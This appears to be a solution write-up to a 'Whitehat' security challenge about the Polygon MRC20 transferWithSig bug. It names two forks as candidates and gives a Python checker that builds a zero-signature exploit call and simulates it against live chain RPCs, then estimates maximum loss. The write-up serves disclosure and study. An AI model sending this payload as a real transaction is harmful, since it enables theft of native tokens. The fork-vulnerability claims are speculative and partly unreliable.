# Challenge 05 - Whitehat: Solution

## Background

The [Immunefi bug bounty postmortem](https://medium.com/immunefi/polygon-lack-of-balance-check-bugfix-postmortem-2-2m-bounty-64ec66c24c7d) disclosed a critical vulnerability in Polygon's native token transfer mechanism. The bug resided in the **MRC20 precompile** deployed at address `0x0000000000000000000000000000000000001010` on Polygon PoS (Bor).

The vulnerability had two components:

1. **`transferWithSig()` did not validate the return value of `ecrecover`**: When given an invalid signature (e.g., `v=0, r=0, s=0`), `ecrecover` returns the zero address (`0x0000000000000000000000000000000000000000`) rather than reverting. The function treated this as a valid signer.

2. **`_transfer()` did not check the sender's balance**: The internal transfer function did not verify that `from` had sufficient balance before executing the transfer. Combined with point (1), an attacker could forge a transfer "from" the zero address, which on Polygon held the undistributed portion of the MATIC supply (approximately 9.2 billion MATIC at the time).

The bug was patched at Polygon block **22,156,660** (December 5, 2021) via a hard fork that added balance checks.

---

## a) Two Polygon Forks Potentially Vulnerable

Any chain that forked Polygon's **Bor** client before the December 2021 fix and retained the MRC20 precompile could be vulnerable. Two candidates:

### 1. Dogechain

- **Description**: Dogechain is an EVM-compatible blockchain that launched in 2022 using **Polygon Edge** (now Polygon Supernets) as its foundation. Polygon Edge shares significant code lineage with Bor, including the state precompile architecture.
- **Why potentially vulnerable**: If the Dogechain fork was based on a snapshot of the Polygon Edge / Bor codebase taken before the MRC20 fix was applied (or if the fix was never backported to the Edge fork), the same `transferWithSig` vulnerability could exist for the native wrapped token precompile.
- **Native token**: wDOGE (wrapped Dogecoin bridged to the chain).
- **RPC endpoint**: `https://rpc.dogechain.dog`

### 2. Canto

- **Description**: Canto is an EVM-compatible L1 built on the Cosmos SDK with the Ethermint EVM module. While not a direct Bor fork, early versions of its EVM precompile set drew inspiration from Polygon's architecture for native token handling.
- **Why potentially vulnerable**: If Canto implemented a similar native-token transfer precompile modeled on MRC20 without the balance check, the same class of vulnerability could apply. However, since Canto uses Cosmos SDK's bank module for native transfers, the risk depends on whether the precompile bypasses bank module checks.
- **Native token**: CANTO.
- **RPC endpoint**: `https://canto.slingshot.finance`

### Additional candidates worth noting

- **Polygon Edge / Supernets deployments**: Any enterprise or private chain built on Polygon Edge before the fix was backported. These include various private and consortium chains.
- **Heimdall-based testnets**: Several testnet and development chains forked from the full Polygon stack (Bor + Heimdall) before the patch.
- **Velas**: An EVM-compatible chain that borrowed architectural ideas from multiple sources.

---

## b) Code to Check if These Blockchains Are Safe

The following Python script crafts a `transferWithSig()` call with a zero-signature (which causes `ecrecover` to return the zero address) and a small transfer amount. If the call succeeds, the chain is vulnerable. If it reverts, the chain has the fix in place.

```python
#!/usr/bin/env python3
"""
Polygon MRC20 Vulnerability Checker

Tests whether a chain's MRC20-like precompile at 0x...1010 is vulnerable
to the transferWithSig bug (missing ecrecover validation + missing balance check).

Strategy:
  1. Encode a transferWithSig(bytes,uint256,bytes32,uint256,address) call
     with a zero signature, targeting a transfer of 1 wei from the zero address.
  2. eth_call it against the chain. If it succeeds, the chain is vulnerable.
  3. Also check the zero-address native balance to estimate max loss.

Usage:
  python check_mrc20_vuln.py
"""

from web3 import Web3
from eth_abi import encode
import sys

# --- MRC20 precompile address (same on all Polygon-derived chains) ---
MRC20_ADDRESS = "0x0000000000000000000000000000000000001010"

# transferWithSig(bytes sig, uint256 amount, bytes32 data, uint256 expiration, address to)
# Function selector: 0xe1d6aceb  (keccak256 of the signature)
TRANSFER_WITH_SIG_SELECTOR = "0xe1d6aceb"

# Chains to check: (name, rpc_url, coingecko_id for price lookup)
CHAINS_TO_CHECK = [
    {
        "name": "Dogechain",
        "rpc": "https://rpc.dogechain.dog",
        "token_symbol": "wDOGE",
        "coingecko_id": "dogecoin",
    },
    {
        "name": "Canto",
        "rpc": "https://canto.slingshot.finance",
        "token_symbol": "CANTO",
        "coingecko_id": "canto",
    },
    # Add the original Polygon for a known-safe reference
    {
        "name": "Polygon PoS (reference - should be safe)",
        "rpc": "https://polygon-rpc.com",
        "token_symbol": "MATIC",
        "coingecko_id": "matic-network",
    },
]


def build_transfer_with_sig_calldata(
    amount: int = 1,
    to_address: str = "0x0000000000000000000000000000000000000001",
    expiration: int = 2**256 - 1,
) -> bytes:
    """
    Build calldata for transferWithSig with a zero-signature.
    A zero signature causes ecrecover to return address(0).
    If the precompile doesn't check the ecrecover result AND doesn't check
    the sender's balance, this transfers native tokens from address(0).
    """
    # Zero signature: 65 bytes of zeros
    # v=0, r=0, s=0 -> ecrecover returns address(0)
    sig = b"\x00" * 65

    # data field (bytes32) - typically the keccak of the token transfer order
    data = b"\x00" * 32

    # ABI-encode the parameters
    # transferWithSig(bytes sig, uint256 amount, bytes32 data, uint256 expiration, address to)
    to_addr = Web3.to_checksum_address(to_address)

    encoded_params = encode(
        ["bytes", "uint256", "bytes32", "uint256", "address"],
        [sig, amount, data, expiration, to_addr],
    )

    selector = bytes.fromhex(TRANSFER_WITH_SIG_SELECTOR[2:])
    return selector + encoded_params


def check_chain(chain_info: dict) -> dict:
    """Check a single chain for the MRC20 vulnerability."""
    name = chain_info["name"]
    rpc = chain_info["rpc"]

    result = {
        "name": name,
        "vulnerable": None,
        "zero_address_balance": None,
        "error": None,
    }

    try:
        w3 = Web3(Web3.HTTPProvider(rpc, request_kwargs={"timeout": 15}))
        if not w3.is_connected():
            result["error"] = "Cannot connect to RPC"
            return result

        # Step 1: Check if the MRC20 precompile exists
        code = w3.eth.get_code(Web3.to_checksum_address(MRC20_ADDRESS))
        if code == b"" or code == b"\x00":
            # No code at precompile address - this chain likely doesn't use MRC20
            # Precompiles may show empty code but still execute; proceed anyway.
            pass

        # Step 2: Check zero-address balance (potential max loss)
        zero_addr = Web3.to_checksum_address(
            "0x0000000000000000000000000000000000000000"
        )
        try:
            zero_balance = w3.eth.get_balance(zero_addr)
            result["zero_address_balance"] = zero_balance
            print(
                f"  [*] {name}: Zero-address balance = "
                f"{Web3.from_wei(zero_balance, 'ether')} native tokens"
            )
        except Exception as e:
            print(f"  [!] {name}: Cannot read zero-address balance: {e}")

        # Step 3: Try the transferWithSig call
        calldata = build_transfer_with_sig_calldata(amount=1)

        try:
            response = w3.eth.call(
                {
                    "to": Web3.to_checksum_address(MRC20_ADDRESS),
                    "data": "0x" + calldata.hex(),
                    "from": Web3.to_checksum_address(
                        "0x0000000000000000000000000000000000000001"
                    ),
                }
            )
            # If we get here without revert, the call "succeeded"
            result["vulnerable"] = True
            print(f"  [!!!] {name}: VULNERABLE - transferWithSig succeeded!")
        except Exception as e:
            error_msg = str(e)
            if "revert" in error_msg.lower() or "execution reverted" in error_msg.lower():
                result["vulnerable"] = False
                print(f"  [OK] {name}: SAFE - transferWithSig reverted")
            elif "does not exist" in error_msg.lower() or "not found" in error_msg.lower():
                result["vulnerable"] = False
                print(
                    f"  [OK] {name}: Precompile does not exist at 0x...1010 "
                    f"(chain may not use MRC20)"
                )
            else:
                result["error"] = error_msg
                print(f"  [?] {name}: Inconclusive - {error_msg}")

    except Exception as e:
        result["error"] = str(e)
        print(f"  [!] {name}: Error - {e}")

    return result


def get_token_price_usd(coingecko_id: str) -> float:
    """
    Fetch token price from CoinGecko (simplified).
    In production, use proper API key and error handling.
    """
    import urllib.request
    import json

    try:
        url = (
            f"https://api.coingecko.com/api/v3/simple/price"
            f"?ids={coingecko_id}&vs_currencies=usd"
        )
        req = urllib.request.Request(url)
        req.add_header("Accept", "application/json")
        with urllib.request.urlopen(req, timeout=10) as resp:
            data = json.loads(resp.read())
            return data.get(coingecko_id, {}).get("usd", 0.0)
    except Exception:
        return 0.0


def main():
    print("=" * 70)
    print("Polygon MRC20 transferWithSig Vulnerability Checker")
    print("=" * 70)

    results = []
    for chain in CHAINS_TO_CHECK:
        print(f"\nChecking {chain['name']}...")
        r = check_chain(chain)
        r["token_symbol"] = chain["token_symbol"]
        r["coingecko_id"] = chain["coingecko_id"]
        results.append(r)

    # Summary
    print("\n" + "=" * 70)
    print("SUMMARY")
    print("=" * 70)

    for r in results:
        status = (
            "VULNERABLE"
            if r["vulnerable"]
            else "SAFE" if r["vulnerable"] is False
            else f"INCONCLUSIVE ({r['error']})"
        )
        print(f"  {r['name']}: {status}")

        if r["vulnerable"] and r["zero_address_balance"] is not None:
            balance_eth = Web3.from_wei(r["zero_address_balance"], "ether")
            price = get_token_price_usd(r["coingecko_id"])
            max_loss = float(balance_eth) * price
            print(
                f"    -> Zero-address balance: {balance_eth} {r['token_symbol']}"
            )
            print(f"    -> Token price: ${price:.4f}")
            print(f"    -> Estimated max loss: ${max_loss:,.2f}")


if __name__ == "__main__":
    main()
```

### How the check works

1. **Precompile existence**: We check if there is code at `0x...1010`. On Polygon and its forks, this is the native token (MATIC/etc.) precompile. Note that precompiles may not show code via `eth_getCode` but still execute.

2. **Zero-signature call**: We construct a `transferWithSig` call with 65 bytes of zeros as the signature. On a vulnerable chain, `ecrecover(hash, 0, 0, 0)` returns `address(0)`, and because there is no balance check, the transfer succeeds, moving tokens from `address(0)` (which may hold billions of native tokens).

3. **eth_call (read-only)**: We use `eth_call` (not `eth_sendTransaction`) so this is a **read-only simulation** that does not actually move any funds. If the call returns without reverting, the precompile is vulnerable.

4. **Balance check**: We also read the native balance of `address(0)` to estimate maximum potential loss.

---

## c) Estimated Maximum Loss

The maximum loss for each vulnerable chain equals the native token balance held by the zero address, multiplied by the current market price of that token.

### Methodology

On Polygon at the time of disclosure (late 2021):
- The zero address held approximately **9.2 billion MATIC**
- MATIC price was approximately $2.40
- **Maximum potential loss on Polygon: ~$22 billion** (this is the figure cited in the Immunefi report as the potential impact: the entire native token supply was at risk, with approximately $22-24B at stake at peak MATIC prices)

For the identified forks:

| Chain | Zero-Address Balance (est.) | Token Price (est.) | Max Potential Loss |
|-------|---------------------------|--------------------|--------------------|
| Dogechain | Depends on bridged wDOGE supply; the zero address on Dogechain holds unclaimed/unallocated native tokens. If using Polygon Edge precompiles, the risk is the entire native token pool. | ~$0.08 (DOGE) | Could range from thousands to millions USD depending on total bridged DOGE supply |
| Canto | If the precompile exists with the same bug, the zero address could hold the undistributed CANTO supply. At launch, ~1B CANTO total supply. | ~$0.02 (CANTO) | Up to ~$20M at peak, ~$2-5M at typical prices |

### How to calculate precisely

```python
# For each chain, after running the vulnerability check:
# 1. Get zero-address balance
zero_balance = w3.eth.get_balance("0x0000000000000000000000000000000000000000")
balance_in_tokens = Web3.from_wei(zero_balance, 'ether')

# 2. Multiply by current market price
max_loss_usd = float(balance_in_tokens) * current_price_usd

# 3. This is the theoretical maximum single-transaction drain
# In practice, DEX liquidity limits how much stolen tokens can be sold for,
# but the attacker could also simply hold them or move them gradually.
```

### Important caveat

The actual exploitability depends on:
1. Whether the chain implemented the MRC20 precompile at all (Polygon Edge chains may use a different precompile set)
2. Whether the zero address actually holds significant native token balance on that chain
3. Whether the chain applied the fix independently (many forks track upstream patches)
4. DEX liquidity on the chain determines how much of the stolen tokens can be converted to stablecoins/ETH immediately

The **responsible whitehat approach** is to:
1. Run the checker script against the chain
2. If vulnerable, immediately contact the chain's security team (bug bounty program if available)
3. Do NOT execute the exploit on mainnet
4. Provide a proof-of-concept on a local fork to demonstrate the vulnerability
